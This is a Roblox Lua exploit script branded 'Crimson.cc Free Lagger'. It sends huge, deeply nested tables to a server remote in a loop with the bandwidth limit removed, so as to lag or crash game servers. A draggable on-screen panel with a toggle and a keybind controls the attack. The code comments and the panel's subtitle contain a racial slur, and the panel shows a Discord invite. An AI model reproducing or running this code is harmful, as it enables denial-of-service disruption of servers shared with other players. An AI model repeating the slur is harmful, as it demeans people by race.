local Players = game:GetService("Players") local CoreGui = game:GetService("CoreGui") local UserInputService = game:GetService("UserInputService") local TweenService = game:GetService("TweenService") local RunService = game:GetService("RunService") local LocalPlayer = Players.LocalPlayer local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled local LAGGER_CONFIG = isMobile and { TableIncrease = 285, Tries = 1, LoopWaitTime = 0.85 } or { TableIncrease = 270, Tries = 1, LoopWaitTime = 0.05 } local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList" local function resolveRemote(path) if not path or path == "" then return nil end local obj = game local cleaned = path:gsub("^game%.", "") for segment in cleaned:gmatch("[^%.]+") do if obj then obj = obj[segment] else return nil end end return obj end local function getmaxvalue(val) local mainvalueifonetable = 499999 if type(val) ~= "number" then return nil end return mainvalueifonetable / (val + 2) end local function bomb(tableincrease, tries) local maintable = {} local spammedtable = {} table.insert(spammedtable, {}) local z = spammedtable[1] for i = 1, tableincrease do local tableins = {} table.insert(z, tableins) z = tableins end local maximum = getmaxvalue(tableincrease) or 9999999 for i = 1, maximum do table.insert(maintable, spammedtable) if i % 5000 == 0 then task.wait() end end local remote = resolveRemote(CUSTOM_REMOTE_PATH) if remote then for i = 1, tries do pcall(function() if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then remote:FireServer(maintable) elseif remote:IsA("RemoteFunction") then remote:InvokeServer(maintable) end end) end end end local laggerEnabled = false local laggerThread = nil local function startLaggerLoop() while laggerEnabled do game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) task.spawn(function() bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries) end) task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15)) end end local function stopLaggerLoop() laggerEnabled = false if laggerThread then coroutine.close(laggerThread) laggerThread = nil end end local function startLagger() if laggerThread then return end laggerEnabled = true laggerThread = coroutine.create(startLaggerLoop) coroutine.resume(laggerThread) end -- Optimization for _, v in pairs(workspace:GetDescendants()) do if v:IsA("Texture") or v:IsA("Decal") then v:Destroy() elseif v:IsA("Part") and v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then v.Material = Enum.Material.SmoothPlastic end end -- ================================================================================== --DEBOF BY WEEKLY DEBOF BOT WEEKLY IS BACK NIGGAS -- ================================================================================== local ScreenGui = Instance.new("ScreenGui") ScreenGui.Name = "CrimsonLaggerUI" ScreenGui.ResetOnSpawn = false ScreenGui.Parent = CoreGui -- MAIN FRAME (260x190 to make room for the discord text in the title area) local MainFrame = Instance.new("Frame") MainFrame.Size = UDim2.new(0, 260, 0, 190) MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0) MainFrame.AnchorPoint = Vector2.new(0.5, 0.5) MainFrame.BackgroundColor3 = Color3.fromRGB(18, 8, 8) MainFrame.BorderSizePixel = 0 MainFrame.Active = true MainFrame.Parent = ScreenGui local MainCorner = Instance.new("UICorner") MainCorner.CornerRadius = UDim.new(0, 10) MainCorner.Parent = MainFrame local MainStroke = Instance.new("UIStroke") MainStroke.Color = Color3.fromRGB(205, 50, 50) MainStroke.Thickness = 1.5 MainStroke.Parent = MainFrame -- TITLE ROW (Height increased to 60 to fit Title, Subtitle, and Discord) local TitleRow = Instance.new("Frame") TitleRow.Size = UDim2.new(1, -20, 0, 60) TitleRow.Position = UDim2.new(0, 10, 0, 10) TitleRow.BackgroundTransparency = 1 TitleRow.Parent = MainFrame local AccentLine = Instance.new("Frame") AccentLine.Size = UDim2.new(0, 4, 0, 18) AccentLine.Position = UDim2.new(0, 0, 0.5, -9) AccentLine.BackgroundColor3 = Color3.fromRGB(205, 50, 50) AccentLine.Parent = TitleRow local AccentCorner = Instance.new("UICorner") AccentCorner.CornerRadius = UDim.new(1, 0) AccentCorner.Parent = AccentLine local TitleLabel = Instance.new("TextLabel") TitleLabel.Text = "Crimson.cc Free Lagger" TitleLabel.Font = Enum.Font.GothamBold TitleLabel.TextColor3 = Color3.new(1, 1, 1) TitleLabel.TextSize = 14 TitleLabel.BackgroundTransparency = 1 TitleLabel.Position = UDim2.new(0, 14, 0, 10) TitleLabel.Size = UDim2.new(0, 180, 0, 18) TitleLabel.TextXAlignment = Enum.TextXAlignment.Left TitleLabel.Parent = TitleRow -- SUBTITLE local SubTitleLabel = Instance.new("TextLabel") SubTitleLabel.Text = "BY WEEKLY DEBOF BOT NIGGA" SubTitleLabel.Font = Enum.Font.GothamBold SubTitleLabel.TextColor3 = Color3.new(1, 1, 1) SubTitleLabel.TextSize = 9 SubTitleLabel.BackgroundTransparency = 1 SubTitleLabel.Position = UDim2.new(0, 14, 0, 30) SubTitleLabel.Size = UDim2.new(0, 180, 0, 12) SubTitleLabel.TextXAlignment = Enum.TextXAlignment.Left SubTitleLabel.Parent = TitleRow -- DISCORD LINK (Moved directly under the subtitle) local DiscordLabel = Instance.new("TextLabel") DiscordLabel.Text = "discord.gg/8nBA6e9Nc4" DiscordLabel.Font = Enum.Font.GothamBold DiscordLabel.TextColor3 = Color3.new(1, 1, 1) DiscordLabel.TextSize = 9 DiscordLabel.BackgroundTransparency = 1 DiscordLabel.Position = UDim2.new(0, 14, 0, 46) DiscordLabel.Size = UDim2.new(0, 180, 0, 12) DiscordLabel.TextXAlignment = Enum.TextXAlignment.Left DiscordLabel.Parent = TitleRow -- MINIMIZE BUTTON (Moved much closer to the top-right corner) local MinimizeBtn = Instance.new("TextButton") MinimizeBtn.Text = "-" MinimizeBtn.Font = Enum.Font.GothamBold MinimizeBtn.TextColor3 = Color3.fromRGB(210, 210, 210) MinimizeBtn.BackgroundColor3 = Color3.fromRGB(35, 15, 15) MinimizeBtn.Size = UDim2.new(0, 20, 0, 20) MinimizeBtn.Position = UDim2.new(1, -54, 0, 10) MinimizeBtn.Parent = TitleRow local MinCorner = Instance.new("UICorner") MinCorner.CornerRadius = UDim.new(1, 0) MinCorner.Parent = MinimizeBtn -- CLOSE BUTTON (Moved much closer to the top-right corner) local CloseBtn = Instance.new("TextButton") CloseBtn.Text = "X" CloseBtn.Font = Enum.Font.GothamBold CloseBtn.TextColor3 = Color3.fromRGB(210, 210, 210) CloseBtn.BackgroundColor3 = Color3.fromRGB(35, 15, 15) CloseBtn.Size = UDim2.new(0, 20, 0, 20) CloseBtn.Position = UDim2.new(1, -28, 0, 10) CloseBtn.Parent = TitleRow local CloseCorner = Instance.new("UICorner") CloseCorner.CornerRadius = UDim.new(1, 0) CloseCorner.Parent = CloseBtn CloseBtn.MouseButton1Click:Connect(function() stopLaggerLoop() ScreenGui:Destroy() end) -- ROW 1: LAG TOGGLE local Row1 = Instance.new("Frame") Row1.Size = UDim2.new(1, -20, 0, 30) Row1.Position = UDim2.new(0, 10, 0, 80) Row1.BackgroundColor3 = Color3.fromRGB(30, 12, 12) Row1.Parent = MainFrame local Row1Corner = Instance.new("UICorner") Row1Corner.CornerRadius = UDim.new(0, 8) Row1Corner.Parent = Row1 local Row1Stroke = Instance.new("UIStroke") Row1Stroke.Color = Color3.fromRGB(180, 40, 40) Row1Stroke.Thickness = 1 Row1Stroke.Parent = Row1 local ToggleLabel = Instance.new("TextLabel") ToggleLabel.Text = "Lag" ToggleLabel.Font = Enum.Font.GothamBold ToggleLabel.TextColor3 = Color3.new(1, 1, 1) ToggleLabel.TextSize = 13 ToggleLabel.BackgroundTransparency = 1 ToggleLabel.Position = UDim2.new(0, 12, 0.5, -9) ToggleLabel.Size = UDim2.new(0, 50, 0, 18) ToggleLabel.TextXAlignment = Enum.TextXAlignment.Left ToggleLabel.Parent = Row1 -- SWITCH local SwitchBg = Instance.new("Frame") SwitchBg.BackgroundColor3 = Color3.fromRGB(60, 20, 20) SwitchBg.Size = UDim2.new(0, 34, 0, 18) SwitchBg.Position = UDim2.new(1, -46, 0.5, -9) SwitchBg.Parent = Row1 local SWCorner = Instance.new("UICorner") SWCorner.CornerRadius = UDim.new(1, 0) SWCorner.Parent = SwitchBg local SwitchKnob = Instance.new("Frame") SwitchKnob.BackgroundColor3 = Color3.fromRGB(230, 230, 230) SwitchKnob.Size = UDim2.new(0, 14, 0, 14) SwitchKnob.Position = UDim2.new(0, 2, 0.5, -7) SwitchKnob.Parent = SwitchBg local SKCorner = Instance.new("UICorner") SKCorner.CornerRadius = UDim.new(1, 0) SKCorner.Parent = SwitchKnob local ToggleBtn = Instance.new("TextButton") ToggleBtn.BackgroundTransparency = 1 ToggleBtn.Size = UDim2.new(1, 0, 1, 0) ToggleBtn.Parent = Row1 -- ROW 2: KEYBIND (Default E) local Row2 = Instance.new("Frame") Row2.Size = UDim2.new(1, -20, 0, 30) Row2.Position = UDim2.new(0, 10, 0, 120) Row2.BackgroundColor3 = Color3.fromRGB(30, 12, 12) Row2.Parent = MainFrame local Row2Corner = Instance.new("UICorner") Row2Corner.CornerRadius = UDim.new(0, 8) Row2Corner.Parent = Row2 local Row2Stroke = Instance.new("UIStroke") Row2Stroke.Color = Color3.fromRGB(180, 40, 40) Row2Stroke.Thickness = 1 Row2Stroke.Parent = Row2 local KeybindLabel = Instance.new("TextLabel") KeybindLabel.Text = "Keybind" KeybindLabel.Font = Enum.Font.GothamBold KeybindLabel.TextColor3 = Color3.new(1, 1, 1) KeybindLabel.TextSize = 13 KeybindLabel.BackgroundTransparency = 1 KeybindLabel.Position = UDim2.new(0, 12, 0.5, -9) KeybindLabel.Size = UDim2.new(0, 70, 0, 18) KeybindLabel.TextXAlignment = Enum.TextXAlignment.Left KeybindLabel.Parent = Row2 local KeybindBtn = Instance.new("TextButton") KeybindBtn.Text = "E" KeybindBtn.Font = Enum.Font.GothamBold KeybindBtn.TextColor3 = Color3.fromRGB(205, 50, 50) KeybindBtn.BackgroundColor3 = Color3.fromRGB(18, 8, 8) KeybindBtn.Size = UDim2.new(0, 55, 0, 22) KeybindBtn.Position = UDim2.new(1, -68, 0.5, -11) KeybindBtn.Parent = Row2 local KBtnCorner = Instance.new("UICorner") KBtnCorner.CornerRadius = UDim.new(0, 5) KBtnCorner.Parent = KeybindBtn local KBtnStroke = Instance.new("UIStroke") KBtnStroke.Color = Color3.fromRGB(205, 50, 50) KBtnStroke.Thickness = 1 KBtnStroke.Parent = KeybindBtn -- ROW 3: STATUS / IDLE local Row3 = Instance.new("Frame") Row3.Size = UDim2.new(1, -20, 0, 30) Row3.Position = UDim2.new(0, 10, 0, 160) Row3.BackgroundColor3 = Color3.fromRGB(30, 12, 12) Row3.Parent = MainFrame local Row3Corner = Instance.new("UICorner") Row3Corner.CornerRadius = UDim.new(0, 8) Row3Corner.Parent = Row3 local Row3Stroke = Instance.new("UIStroke") Row3Stroke.Color = Color3.fromRGB(180, 40, 40) Row3Stroke.Thickness = 1 Row3Stroke.Parent = Row3 local StatusDot = Instance.new("Frame") StatusDot.Size = UDim2.new(0, 7, 0, 7) StatusDot.Position = UDim2.new(0, 12, 0.5, -3.5) StatusDot.BackgroundColor3 = Color3.fromRGB(205, 50, 50) StatusDot.Parent = Row3 local SDotCorner = Instance.new("UICorner") SDotCorner.CornerRadius = UDim.new(1, 0) SDotCorner.Parent = StatusDot local StatusLabel = Instance.new("TextLabel") StatusLabel.Text = "Idle" StatusLabel.Font = Enum.Font.GothamMedium StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 200) StatusLabel.TextSize = 13 StatusLabel.BackgroundTransparency = 1 StatusLabel.Position = UDim2.new(0, 25, 0.5, -9) StatusLabel.Size = UDim2.new(0, 60, 0, 18) StatusLabel.TextXAlignment = Enum.TextXAlignment.Left StatusLabel.Parent = Row3 -- ========================================================================= -- TOGGLE & MINIMIZE LOGIC -- ========================================================================= local function setToggle(state) laggerEnabled = state local goal = state and UDim2.new(1, -18, 0.5, -7) or UDim2.new(0, 2, 0.5, -7) local color = state and Color3.fromRGB(205, 50, 50) or Color3.fromRGB(60, 20, 20) TweenService:Create(SwitchKnob, TweenInfo.new(0.15), {Position = goal}):Play() TweenService:Create(SwitchBg, TweenInfo.new(0.15), {BackgroundColor3 = color}):Play() StatusLabel.Text = state and "Active" or "Idle" if state then startLagger() else stopLaggerLoop() end end ToggleBtn.MouseButton1Click:Connect(function() setToggle(not laggerEnabled) end) -- MINIMIZE LOGIC local isMinimized = false local originalSize = UDim2.new(0, 260, 0, 190) local minimizedSize = UDim2.new(0, 260, 0, 60) -- Matches TitleRow height MinimizeBtn.MouseButton1Click:Connect(function() isMinimized = not isMinimized MinimizeBtn.Text = isMinimized and "+" or "-" Row1.Visible = not isMinimized Row2.Visible = not isMinimized Row3.Visible = not isMinimized TweenService:Create(MainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Size = isMinimized and minimizedSize or originalSize }):Play() end) -- ========================================================================= -- BULLETPROOF KEYBIND LOGIC (Default is E) -- ========================================================================= local boundKey = Enum.KeyCode.E local listeningForKey = false local listenTimeout = nil local keyDown = false KeybindBtn.MouseButton1Click:Connect(function() if listenTimeout then task.cancel(listenTimeout) end listeningForKey = true KeybindBtn.Text = "..." listenTimeout = task.delay(5, function() if listeningForKey then listeningForKey = false KeybindBtn.Text = tostring(boundKey):gsub("Enum.KeyCode.", "") end end) end) UserInputService.InputBegan:Connect(function(input, gameProcessed) if gameProcessed then return end if input.UserInputType ~= Enum.UserInputType.Keyboard then return end if listeningForKey then boundKey = input.KeyCode local keyName = tostring(boundKey):gsub("Enum.KeyCode.", "") KeybindBtn.Text = keyName listeningForKey = false if listenTimeout then task.cancel(listenTimeout) listenTimeout = nil end end end) RunService.RenderStepped:Connect(function() if boundKey and UserInputService:IsKeyDown(boundKey) then if not keyDown then keyDown = true setToggle(not laggerEnabled) end else keyDown = false end end) -- ========================================================================= -- DRAGGING LOGIC -- ========================================================================= local dragging = false local dragStart = nil local startPos = nil MainFrame.InputBegan:Connect(function(input) if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then dragging = true dragStart = input.Position startPos = MainFrame.Position end end) UserInputService.InputChanged:Connect(function(input) if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then local delta = input.Position - dragStart local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) MainFrame.Position = newPos end end) UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end end)
